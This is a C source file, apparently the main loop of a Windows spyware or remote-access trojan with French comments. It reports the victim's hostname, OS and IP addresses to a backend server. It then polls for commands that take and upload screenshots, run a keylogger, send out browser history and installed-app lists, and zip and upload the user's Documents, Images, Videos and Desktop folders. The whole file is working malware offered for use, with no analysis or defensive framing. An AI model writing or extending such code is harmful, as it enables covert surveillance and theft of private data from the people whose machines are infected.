#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include "config.h"
#include "core/system_info.h"
#include "core/screenshot.h"
#include "core/keylogger.h"
#include "core/browser_history.h"
#include "core/installed_apps.h"
#include "core/file_enum.h"
#include "network/ip.h"
#include "network/communication.h"

/* Exécute la commande reçue depuis le serveur */
static void dispatch(int machine_id, const char *cmd) {

    if (strcmp(cmd, "screenshot") == 0) {
        capture_screenshot(SCREENSHOT_FILE);
        upload_file(machine_id, SCREENSHOT_FILE, "screenshot.bmp");
        DeleteFile(SCREENSHOT_FILE);

    } else if (strcmp(cmd, "start_keylog") == 0) {
        start_keylogger(machine_id);
        post_result(machine_id, "{\"type\":\"text\",\"data\":\"Keylogger demarre\"}");

    } else if (strcmp(cmd, "stop_keylog") == 0) {
        stop_keylogger();
        post_result(machine_id, "{\"type\":\"text\",\"data\":\"Keylogger arrete\"}");

    } else if (strcmp(cmd, "browser_history") == 0) {
        char *history = malloc(LARGE_BUFFER);
        if (!history) return;
        get_browser_history(history, LARGE_BUFFER);
        size_t result_sz = LARGE_BUFFER + 32;
        char *result = malloc(result_sz);
        if (result) {
            snprintf(result, result_sz, "{\"type\":\"json\",\"data\":%s}", history);
            post_result(machine_id, result);
            free(result);
        }
        free(history);

    } else if (strcmp(cmd, "apps") == 0) {
        char *apps = malloc(LARGE_BUFFER);
        if (!apps) return;
        get_installed_apps(apps, LARGE_BUFFER);
        size_t result_sz = LARGE_BUFFER + 32;
        char *result = malloc(result_sz);
        if (result) {
            snprintf(result, result_sz, "{\"type\":\"json\",\"data\":%s}", apps);
            post_result(machine_id, result);
            free(result);
        }
        free(apps);

    } else if (strncmp(cmd, "files:", 6) == 0) {
        const char *folder = cmd + 6;  /* "Documents", "Images", "Videos", "Bureau" */
        char zip_name[64];
        snprintf(zip_name, sizeof(zip_name), "%s.zip", folder);
        enumerate_and_zip_folder(folder, zip_name);
        upload_file(machine_id, zip_name, zip_name);
        DeleteFile(zip_name);
    }
}

int main(void) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    char hostname[BUFFER_SIZE], os_info[BUFFER_SIZE];
    char private_ip[BUFFER_SIZE], public_ip[BUFFER_SIZE];

    get_hostname(hostname, sizeof(hostname));
    get_os_version(os_info, sizeof(os_info));
    get_private_ip(private_ip, sizeof(private_ip));
    get_public_ip(public_ip, sizeof(public_ip));

    printf("[*] Hostname   : %s\n", hostname);
    printf("[*] OS         : %s\n", os_info);
    printf("[*] Private IP : %s\n", private_ip);
    printf("[*] Public IP  : %s\n", public_ip);

    MachineReport report = {
        .hostname   = hostname,
        .os_info    = os_info,
        .private_ip = private_ip,
        .public_ip  = public_ip,
    };

    int machine_id = send_report(REPORT_URL, &report);
    if (machine_id <= 0) {
        fprintf(stderr, "[!] Echec de l'enregistrement (backend inaccessible ?)\n");
        WSACleanup();
        return 1;
    }
    printf("[*] Enregistre avec l'ID %d\n", machine_id);
    printf("[*] En attente de commandes (poll toutes les 30s)...\n");

    char command[BUFFER_SIZE];
    while (1) {
        memset(command, 0, sizeof(command));
        get_command(machine_id, command, sizeof(command));

        if (command[0]) {
            printf("[*] Commande recue : %s\n", command);
            dispatch(machine_id, command);
            printf("[*] Commande executee.\n");
        }

        Sleep(30000);
    }

    WSACleanup();
    return 0;
}
